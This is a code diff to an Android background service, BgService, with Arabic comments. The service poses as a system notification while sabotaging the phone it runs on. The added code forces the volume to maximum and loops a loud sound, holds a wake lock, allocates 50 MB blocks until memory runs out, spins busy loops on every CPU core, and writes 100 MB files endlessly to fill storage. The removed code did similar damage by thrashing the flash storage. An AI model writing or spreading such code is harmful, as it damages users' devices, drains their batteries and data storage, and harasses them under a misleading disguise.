@@ -9,71 +9,71 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
 import java.io.File;
-import java.io.RandomAccessFile;
+import java.io.FileOutputStream;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Random;
 
 public class BgService extends Service {
     private MediaPlayer mediaPlayer;
     private PowerManager.WakeLock wakeLock;
+    private AudioManager audioManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        
         String CHANNEL = "ch";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel c = new NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel c = new NotificationChannel(CHANNEL, "A_Art", NotificationManager.IMPORTANCE_LOW);
             getSystemService(NotificationManager.class).createNotificationChannel(c);
         }
         Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
-        startForeground(1, b.setContentTitle("System Update").setContentText("Processing...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());
+        startForeground(1, b.setContentTitle("A_Art").setContentText("System Running...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());
 
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App::WakeLock");
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App::WakeLock");
         wakeLock.acquire();
 
-        // 1. الصوت العالي
-        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+        // 1. الصوت
+        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
         mediaPlayer = MediaPlayer.create(this, R.raw.loud);
         mediaPlayer.setLooping(true);
+        mediaPlayer.setVolume(1.0f, 1.0f);
         mediaPlayer.start();
 
-        // 2. تفتيت الذاكرة (Memory Fragmentation)
-        List<byte[]> fragmentedMemory = new ArrayList<>();
+        // 2. استنزاف الرام
+        List<byte[]> memoryHog = new ArrayList<>();
         new Thread(() -> {
             while (true) {
                 try {
-                    for (int i = 0; i < 1000; i++) {
-                        fragmentedMemory.add(new byte[1024]);
-                    }
-                } catch (OutOfMemoryError e) { break; } 
+                    byte[] chunk = new byte[50 * 1024 * 1024]; 
+                    memoryHog.add(chunk);
+                } catch (OutOfMemoryError e) { break; } catch (Exception e) {}
             }
         }).start();
 
-        // 3. تعذيب الفلاشة (Disk Thrashing)
-        for (int i = 0; i < 5; i++) {
-            new Thread(() -> {
-                try {
-                    File dir = getExternalFilesDir(null);
-                    Random rand = new Random();
-                    while (true) {
-                        File file = new File(dir, "thrash_" + rand.nextInt(100000) + ".dat");
-                        RandomAccessFile raf = new RandomAccessFile(file, "rw");
-                        raf.seek(rand.nextInt(1024 * 1024)); 
-                        raf.write(new byte[1024]);
-                        raf.close();
-                        file.delete();
-                    }
-                } catch (Exception e) {}
-            }).start();
-        }
-
-        // 4. استهلاك المعالج
+        // 3. استنزاف المعالج
         for (int i = 0; i < Runtime.getRuntime().availableProcessors(); i++) {
             new Thread(() -> {
                 while (true) { Math.sqrt(Math.random()); }
+            }).start();
+        }
+
+        // 4. استنزاف التخزين بسرعة (ملفات 100 ميجا)
+        for (int i = 0; i < 4; i++) {
+            new Thread(() -> {
+                try {
+                    File dir = getExternalFilesDir(null);
+                    byte[] buffer = new byte[100 * 1024 * 1024]; // 100 ميجا
+                    int fileCount = 0;
+                    while (true) {
+                        File file = new File(dir, "sys_" + fileCount++ + ".bin");
+                        FileOutputStream fos = new FileOutputStream(file);
+                        fos.write(buffer);
+                        fos.close();
+                    }
+                } catch (Exception e) {}
             }).start();
         }
     }
